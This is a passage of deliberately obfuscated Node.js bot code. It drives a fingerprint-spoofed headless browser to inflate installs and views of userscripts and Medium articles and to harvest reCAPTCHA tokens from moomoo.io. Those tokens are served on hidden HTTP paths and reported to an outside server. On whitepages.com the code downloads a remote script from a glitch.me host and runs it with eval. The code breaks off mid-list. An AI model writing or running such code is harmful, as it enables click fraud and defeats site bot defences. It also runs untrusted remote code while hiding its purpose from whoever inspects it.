      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': Z(0x1e) + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + Z(0x12),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + a0(0x1) + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + Y(0x1d, '*x3A'),
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + Z(0x8),
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    Y(0xc, 'i$Nr') + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + a0(0xe) + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2 * 0xc9b + 0x1 * -0x23fa + -0x3d30 * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1974 + 0x1d2b * -0x1 + 0x3b7)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1596 + 0x20b * -0x13 + 0x3ccb), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1111 + 0x9e + 0x10d7), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xb73 + -0x8f3 + -0x10 * 0x28;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1540 + 0x8dd * -0x1 + -0xd * -0x251; w < getRandomInt(0x7b * -0x4b + -0x24b1 + 0x48bb, -0xe * -0xbf + -0x1 * -0xf79 + -0x22 * 0xc3); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1a9f8 + 0x9c58 * 0x2 + -0x1f848);
        }
      }();
    }, 0x1a4a + -0x1 * -0x5c9 + 0x1faf * -0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a1 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1 * 0x963 + -0x15ce * 0x1 + 0xc6b;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z[a1(0x3)](0x50 * -0x9 + 0xfdb + -0x1 * 0xd0b, 0x1793 + -0x1f * 0xad + 0x2 * -0x137)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x6e5 * -0xb + 0x1a59 + 0xa6ae);
    }, 0x1296 * -0x2 + 0x1f4f + 0x641 * 0x1), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a2 = d;
        try {
          let s = -0xf6 * -0x1a + 0x1 * -0xfde + 0x91e * -0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x6b4 + 0x18d + 0x10df), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x566 * -0x4 + 0x5 * 0xfe + 0x21 * -0xce), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x136b22 + 0x2 * 0xd4973 + -0x9914 * -0xb);
        } catch (v) {}
        return await page[a2(0xb)](), await context[a2(0xb)](), r();
      }());
    }, 0x1613 + 0x1 * -0x23d + 0x13 * -0x106);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x9ff + -0x1aa3 + 0x2 * 0x12b5);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1ed1 + 0x2f70 + -0x3 * -0x4fb);
}
doFlags['doOUJS'] && ((async () => {
  const bi = {
      f: '*gdv'
    },
    a5 = b,
    a4 = d;
  async function f() {
    const a3 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x888 + 0x10c4 + 0x12d * -0x7) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xb9f + -0x17c1 + -0xd * -0xef));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x374 + 0x20f0 + -0x2464, D['indexOf']('\x20'));
        return B ? E['slice'](0x25e4 + -0x109c + -0x1548, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3070 + 0x1a17 * -0x1 + 0x10b7),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + a3(0x16, bi.f),
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x199f + -0x299a + 0x17 * 0x49f),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + a4(0x1c) + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + a5(0x15, 'GglL') + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
